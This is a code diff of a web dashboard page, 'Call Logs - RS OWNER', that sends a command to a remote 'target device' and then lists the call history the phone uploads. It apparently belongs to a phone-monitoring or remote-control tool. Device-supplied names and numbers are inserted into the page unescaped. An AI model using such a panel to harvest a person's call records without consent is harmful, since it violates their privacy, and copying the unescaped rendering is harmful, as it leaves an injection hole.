@@ -4,7 +4,7 @@
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <title>Call Logs - RS OWNER</title>
-    <!-- Tailwind CSS for styling -->
+    <!-- Tailwind CSS -->
     <script src="https://cdn.tailwindcss.com"></script>
     <script src="https://unpkg.com/lucide@latest"></script>
     <style>
@@ -16,37 +16,30 @@
             --accent-cyan: #2f81f7;
             --border-color: #30363d;
         }
-        body { 
-            background-color: var(--bg-main); 
-            color: var(--text-main); 
-            min-height: 100vh; 
-            font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Helvetica, Arial, sans-serif;
-        }
-        
-        /* Custom Scrollbar */
+        body { background-color: var(--bg-main); color: var(--text-main); min-height: 100vh; font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", sans-serif; }
         ::-webkit-scrollbar { width: 8px; height: 8px; }
         ::-webkit-scrollbar-track { background: var(--bg-main); }
         ::-webkit-scrollbar-thumb { background: #484f58; border-radius: 4px; }
-        ::-webkit-scrollbar-thumb:hover { background: #8b949e; }
-
-        .glass-panel { 
-            background: var(--bg-card); 
-            border: 1px solid var(--border-color); 
-            border-radius: 12px; 
-            box-shadow: 0 8px 24px rgba(0,0,0,0.2);
-        }
-
+        .glass-panel { background: var(--bg-card); border: 1px solid var(--border-color); border-radius: 12px; box-shadow: 0 8px 24px rgba(0,0,0,0.2); }
         .table-row-hover:hover { background-color: rgba(47, 129, 247, 0.05); }
-        
-        /* Status Badges */
         .badge { @apply px-2.5 py-1 rounded-full text-xs font-semibold uppercase tracking-wider flex items-center gap-1 w-max; }
         .badge-incoming { background: rgba(46, 160, 67, 0.15); color: #3fb950; border: 1px solid rgba(46, 160, 67, 0.4); }
         .badge-outgoing { background: rgba(47, 129, 247, 0.15); color: #58a6ff; border: 1px solid rgba(47, 129, 247, 0.4); }
         .badge-missed { background: rgba(248, 81, 73, 0.15); color: #f85149; border: 1px solid rgba(248, 81, 73, 0.4); }
         .badge-error { background: rgba(248, 81, 73, 0.2); color: #ff7b72; border: 1px solid #f85149; font-weight: bold; }
+        
+        /* Toast Notification Styling */
+        #toast-container { position: fixed; top: 20px; right: 20px; z-index: 50; display: flex; flex-direction: column; gap: 10px; }
+        .toast { padding: 12px 20px; border-radius: 8px; font-size: 14px; font-weight: 500; opacity: 0; transform: translateX(100%); transition: all 0.3s ease; display: flex; align-items: center; gap: 10px; }
+        .toast.show { opacity: 1; transform: translateX(0); }
+        .toast-success { background: rgba(46, 160, 67, 0.9); color: white; border: 1px solid #3fb950; }
+        .toast-info { background: rgba(47, 129, 247, 0.9); color: white; border: 1px solid #58a6ff; }
+        .toast-error { background: rgba(248, 81, 73, 0.9); color: white; border: 1px solid #f85149; }
     </style>
 </head>
 <body class="p-4 md:p-6 flex flex-col md:flex-row gap-6">
+
+    <div id="toast-container"></div>
     
     <!-- Sidebar -->
     <aside class="w-full md:w-64 flex-shrink-0">
@@ -74,21 +67,22 @@
                 <div>
                     <h2 class="text-xl font-bold text-white flex items-center gap-2">
                         <i data-lucide="history" class="w-5 h-5 text-[var(--accent-cyan)]"></i>
-                        Telemetry Call Routing Logs
+                        Call Routing Matrix
                     </h2>
-                    <p class="text-sm text-[var(--text-muted)] mt-1">Real-time synchronized call history matrix.</p>
+                    <p class="text-sm text-[var(--text-muted)] mt-1">On-demand synchronization with target device.</p>
                 </div>
-                <button onclick="engine.forceRefresh()" class="p-2 rounded-md bg-[rgba(255,255,255,0.05)] hover:bg-[rgba(255,255,255,0.1)] border border-[var(--border-color)] transition-colors" title="Force Sync">
-                    <i data-lucide="refresh-cw" class="w-5 h-5 text-gray-300"></i>
+                <!-- 🚀 UPDATED BUTTON -->
+                <button onclick="engine.triggerDeviceSync()" id="sync-btn" class="flex items-center gap-2 px-4 py-2 rounded-md bg-[rgba(47,129,247,0.1)] hover:bg-[rgba(47,129,247,0.2)] text-[var(--accent-cyan)] border border-[var(--accent-cyan)] transition-colors font-medium text-sm">
+                    <i data-lucide="download-cloud" id="sync-icon" class="w-4 h-4"></i>
+                    <span>Fetch From Phone</span>
                 </button>
             </div>
 
-            <!-- 🚨 Error Display Container (Hidden by default) -->
             <div id="error-container" class="hidden mb-6 p-4 rounded-lg bg-[rgba(248,81,73,0.1)] border border-[#f85149]">
                 <div class="flex items-start gap-3">
                     <i data-lucide="alert-triangle" class="w-5 h-5 text-[#f85149] mt-0.5"></i>
                     <div>
-                        <h4 class="font-bold text-[#ff7b72]">System Exception Intercepted</h4>
+                        <h4 class="font-bold text-[#ff7b72]">System Exception</h4>
                         <p id="error-message" class="text-sm text-[#ff7b72] mt-1 font-mono break-all"></p>
                     </div>
                 </div>
@@ -106,24 +100,21 @@
                         </tr>
                     </thead>
                     <tbody id="calls-list" class="divide-y divide-[var(--border-color)] text-sm">
-                        <!-- Loading State -->
                         <tr>
                             <td colspan="4" class="py-12 text-center text-[var(--text-muted)]">
                                 <div class="flex flex-col items-center justify-center gap-3">
                                     <i data-lucide="loader-2" class="w-6 h-6 animate-spin text-[var(--accent-cyan)]"></i>
-                                    Establishing secure connection...
+                                    Loading database records...
                                 </div>
                             </td>
                         </tr>
                     </tbody>
                 </table>
             </div>
-            
         </div>
     </main>
 
     <script>
-        // Initialize Lucide Icons
         lucide.createIcons();
 
         class CallsEngine {
@@ -132,94 +123,136 @@
                 this.init();
             }
 
-            getValidToken() {
-                return localStorage.getItem('owner_token') || localStorage.getItem('session_token') || "";
+            getValidToken() { return localStorage.getItem('owner_token') || localStorage.getItem('session_token') || ""; }
+
+            showToast(message, type = 'info') {
+                const container = document.getElementById('toast-container');
+                const toast = document.createElement('div');
+                toast.className = `toast toast-${type}`;
+                
+                let icon = 'info';
+                if(type === 'success') icon = 'check-circle';
+                if(type === 'error') icon = 'alert-octagon';
+                
+                toast.innerHTML = `<i data-lucide="${icon}" class="w-4 h-4"></i> ${message}`;
+                container.appendChild(toast);
+                lucide.createIcons();
+                
+                setTimeout(() => toast.classList.add('show'), 10);
+                setTimeout(() => {
+                    toast.classList.remove('show');
+                    setTimeout(() => toast.remove(), 300);
+                }, 4000);
             }
 
             async init() {
                 if (!this.activeDeviceId) {
-                    this.showError("No active device bound. Please select a device from the Command Center.");
+                    this.showError("No active device bound.");
                     return;
                 }
                 await this.fetchCalls();
-                this.syncInterval = setInterval(() => this.fetchCalls(), 10000);
             }
 
-            forceRefresh() {
-                const btn = document.querySelector('.lucide-refresh-cw');
-                btn.classList.add('animate-spin');
-                this.fetchCalls().finally(() => setTimeout(() => btn.classList.remove('animate-spin'), 500));
+            // 🚀 THE NEW TRIGGER FUNCTION
+            async triggerDeviceSync() {
+                const btn = document.getElementById('sync-btn');
+                const icon = document.getElementById('sync-icon');
+                const token = this.getValidToken();
+
+                if (!this.activeDeviceId) return;
+
+                // UI Loading state
+                btn.disabled = true;
+                btn.classList.add('opacity-50');
+                icon.setAttribute('data-lucide', 'loader-2');
+                icon.classList.add('animate-spin');
+                lucide.createIcons();
+
+                try {
+                    // 1. Send Command to Python API
+                    const res = await fetch('/api/calls/trigger', {
+                        method: 'POST',
+                        headers: { 
+                            'Authorization': `Bearer ${token}`,
+                            'Content-Type': 'application/json'
+                        },
+                        body: JSON.stringify({ device_id: this.activeDeviceId })
+                    });
+                    
+                    const result = await res.json();
+                    
+                    if(result.status === 'success') {
+                        this.showToast("Command sent! Waiting for device to upload data...", "info");
+                        
+                        // 2. Wait 7 seconds for the phone to process and push data
+                        setTimeout(() => {
+                            this.fetchCalls().then(() => {
+                                this.showToast("Data refreshed from device!", "success");
+                            }).finally(() => this.resetButton(btn, icon));
+                        }, 7000);
+                        
+                    } else {
+                        this.showToast(`Error: ${result.message}`, "error");
+                        this.resetButton(btn, icon);
+                    }
+                } catch (e) {
+                    this.showToast("Network Error: Could not reach server", "error");
+                    this.resetButton(btn, icon);
+                }
+            }
+
+            resetButton(btn, icon) {
+                btn.disabled = false;
+                btn.classList.remove('opacity-50');
+                icon.setAttribute('data-lucide', 'download-cloud');
+                icon.classList.remove('animate-spin');
+                lucide.createIcons();
             }
 
             showError(msg) {
                 const container = document.getElementById('error-container');
-                const msgEl = document.getElementById('error-message');
-                msgEl.innerText = msg;
+                document.getElementById('error-message').innerText = msg;
                 container.classList.remove('hidden');
-                
-                // Hide table loading state if error happens on initial load
-                const list = document.getElementById('calls-list');
-                if (list.innerHTML.includes('Establishing secure connection')) {
-                     list.innerHTML = `<tr><td colspan="4" class="py-8 text-center text-[var(--text-muted)]">Data fetch aborted due to error.</td></tr>`;
-                }
+                document.getElementById('calls-list').innerHTML = `<tr><td colspan="4" class="py-8 text-center text-[var(--text-muted)]">Data fetch aborted.</td></tr>`;
             }
 
-            hideError() {
-                document.getElementById('error-container').classList.add('hidden');
-            }
+            hideError() { document.getElementById('error-container').classList.add('hidden'); }
 
             formatDuration(seconds) {
-                if (seconds === 0 || !seconds) return "0s";
-                const m = Math.floor(seconds / 60);
-                const s = seconds % 60;
-                if (m > 0 && s > 0) return `${m}m ${s}s`;
-                if (m > 0) return `${m}m`;
-                return `${s}s`;
+                if (!seconds || seconds === 0) return "0s";
+                const m = Math.floor(seconds / 60), s = seconds % 60;
+                return (m > 0 && s > 0) ? `${m}m ${s}s` : (m > 0 ? `${m}m` : `${s}s`);
             }
 
             formatDate(isoString) {
                 try {
                     const date = new Date(isoString);
                     if (isNaN(date)) return "Unknown Time";
-                    return new Intl.DateTimeFormat('en-US', {
-                        month: 'short', day: 'numeric',
-                        hour: '2-digit', minute: '2-digit', second: '2-digit',
-                        hour12: true
-                    }).format(date);
+                    return new Intl.DateTimeFormat('en-US', { month: 'short', day: 'numeric', hour: '2-digit', minute: '2-digit', second: '2-digit', hour12: true }).format(date);
                 } catch(e) { return "Invalid Date"; }
             }
 
             async fetchCalls() {
                 const token = this.getValidToken();
-                if (!this.activeDeviceId) return;
-                
                 try {
                     const res = await fetch(`/api/calls?device_id=${this.activeDeviceId}&limit=50`, {
                         headers: { 'Authorization': `Bearer ${token}` }
                     });
-                    
                     const result = await res.json();
                     
-                    if (res.status === 500) {
-                        this.showError(`Backend Server Error (500): ${result.message || "Internal Exception Occurred"}`);
-                        return;
-                    }
-
+                    if (res.status === 500) { this.showError(`Backend Server Error (500)`); return; }
+                    
                     if (result.status === 'success') {
                         this.hideError();
                         this.render(result.data || []);
                     } else {
                         this.showError(`API Error: ${result.message}`);
                     }
-                } catch (e) { 
-                    console.error("Sync Exception:", e); 
-                    this.showError(`Network/Client Error: ${e.message}`);
-                }
+                } catch (e) { this.showError(`Network Error: ${e.message}`); }
             }
 
             render(data) {
                 const container = document.getElementById('calls-list');
-                
                 if (data.length === 0) { 
                     container.innerHTML = `<tr><td colspan="4" class="py-12 text-center text-[var(--text-muted)] flex flex-col items-center gap-2"><i data-lucide="inbox" class="w-8 h-8 opacity-50"></i>No telemetry records found.</td></tr>`;
                     lucide.createIcons();
@@ -229,7 +262,6 @@
                 container.innerHTML = data.map(c => {
                     const isError = c.type === 'ERROR';
                     const safeNumber = c.number || 'Unknown Number';
-                    // Fallback name if contact_name doesn't exist in DB yet
                     const safeName = c.contact_name && c.contact_name !== "Unknown" ? c.contact_name : null;
                     
                     let badgeHtml = '';
@@ -244,30 +276,20 @@
 
                     return `
                     <tr class="table-row-hover transition-colors ${isError ? 'bg-[rgba(248,81,73,0.05)]' : ''}">
-                        <td class="py-4 px-6 whitespace-nowrap">
-                            ${badgeHtml}
-                        </td>
+                        <td class="py-4 px-6 whitespace-nowrap">${badgeHtml}</td>
                         <td class="py-4 px-6">
                             <div class="flex flex-col">
                                 ${safeName ? `<span class="font-semibold text-white">${safeName}</span>` : ''}
                                 <span class="${safeName ? 'text-[var(--text-muted)] text-xs mt-0.5' : 'font-semibold text-white'}">${safeNumber}</span>
                             </div>
                         </td>
-                        <td class="py-4 px-6 whitespace-nowrap text-[var(--text-muted)]">
-                            ${isError ? '---' : this.formatDuration(c.duration)}
-                        </td>
-                        <td class="py-4 px-6 whitespace-nowrap text-[var(--text-muted)] text-xs font-mono">
-                            ${this.formatDate(c.timestamp)}
-                        </td>
+                        <td class="py-4 px-6 whitespace-nowrap text-[var(--text-muted)]">${isError ? '---' : this.formatDuration(c.duration)}</td>
+                        <td class="py-4 px-6 whitespace-nowrap text-[var(--text-muted)] text-xs font-mono">${this.formatDate(c.timestamp)}</td>
                     </tr>`;
                 }).join('');
-                
-                // Re-initialize icons for newly added HTML
                 lucide.createIcons();
             }
         }
-        
-        // Start engine
         const engine = new CallsEngine();
     </script>
 </body>
